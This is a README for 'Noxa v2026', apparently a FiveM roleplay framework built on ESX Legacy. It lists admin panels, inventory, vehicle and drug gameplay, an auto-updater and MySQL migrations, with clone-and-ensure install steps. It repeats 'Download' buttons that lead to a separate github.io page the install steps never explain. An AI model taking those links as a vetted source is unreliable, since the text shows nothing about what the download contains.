# Noxa v2026 - FiveM roleplay framework 2026

> **Noxa v2026 is a FiveM roleplay base built on ESX Legacy, bringing NUI-powered server tools, core gameplay systems, and update support together in a single framework.**

[![Platform](https://img.shields.io/badge/Platform-FiveM-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/jasonlabs59/noxa-fivem-esx-legacy?style=flat-square)](https://github.com/jasonlabs59/noxa-fivem-esx-legacy)

---

<p align="center">
  <a href="https://jasonlabs59.github.io/noxa-fivem-esx-legacy/">
    <img src="https://img.shields.io/badge/Download-Noxa%20Latest-brightgreen?style=for-the-badge" alt="Download Noxa">
  </a>
</p>

> **[Direct Download - Noxa v2026](https://jasonlabs59.github.io/noxa-fivem-esx-legacy/)**

---

[Download Latest Build](https://jasonlabs59.github.io/noxa-fivem-esx-legacy/)

---

## Overview

Noxa is a FiveM roleplay framework centered on ESX Legacy, expanded with the pieces needed to build a modern server foundation. It combines interface elements, gameplay systems, and administration utilities so server creators can avoid stitching together a large collection of separate resources.

This framework is aimed at developers and owners who want a ready-to-use base with the common server-side building blocks already in place. With NUI panels, management tools, and update support included, it is meant to streamline setup while keeping the project focused on everyday server operations.

---

## What it includes

- Roleplay base built on ESX Legacy
- Interactive in-game NUI panels for server actions
- Admin menu for routine oversight
- Server management panel for operational control
- Inventory handling for player item workflows
- Vehicle gameplay system support
- Drug gameplay system support
- Anti-cheat management and update tooling
- GitHub auto-update support
- MySQL migration support for database changes

---

## Installation

1. Download or clone the repository into your FiveM resources folder:
   - `git clone https://github.com/jasonlabs59/noxa-fivem-esx-legacy.git noxa-esx-legacy-base`
2. Move the folder into your server resources directory.
3. Run or import the included MySQL migrations before launching the framework.
4. Add the resource to your server configuration and confirm the required dependencies are available.
5. Start the resource after ESX Legacy and database services are ready.

First-run example:

- `ensure noxa-esx-legacy-base`

---

## Usage

After installation, launch the framework from your `server.cfg` and use the bundled panels for common server tasks. The NUI interfaces are built for in-game administration and workflow control, while the gameplay systems provide the foundation for inventory, vehicle, and drug-related mechanics.

Typical workflow:

1. Start the base resource.
2. Verify the database migrations have been applied.
3. Open the admin or server management panels in-game.
4. Adjust gameplay systems and server settings as needed.
5. Use the update tooling when you want to pull newer builds from GitHub.

---

## Configuration

Most settings live in the framework's resource files and database layout. If your deployment uses environment-specific values, keep them in the resource configuration and make sure they match your MySQL setup.

Example structure:

    config/
    server/
    client/
    database/
    nui/

If you modify any schema-related features, rerun the supplied MySQL migrations so the framework stays aligned with the current version.

---

## Requirements

- FiveM server
- ESX Legacy
- MySQL database access
- Support for running database migrations
- Standard FiveM resource deployment workflow
- A compatible environment for NUI-based interfaces

---

## FAQ

**How do I update Noxa?**  
Use the GitHub auto-update support included with the framework, then continue with your normal deployment routine.

**Where do I change server behavior?**  
Review the resource configuration and any related database migration files, then update those settings before restarting the resource.

**What should I do if a panel does not open?**  
Make sure the resource is running, the NUI files are present, and the server has the necessary dependencies loaded.

**Why are migrations important?**  
They keep the database structure in sync with the framework version you are running.

**Can I use this as a starting point for a new server?**  
Yes. It is intended to serve as a roleplay base for building and operating a FiveM server foundation.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
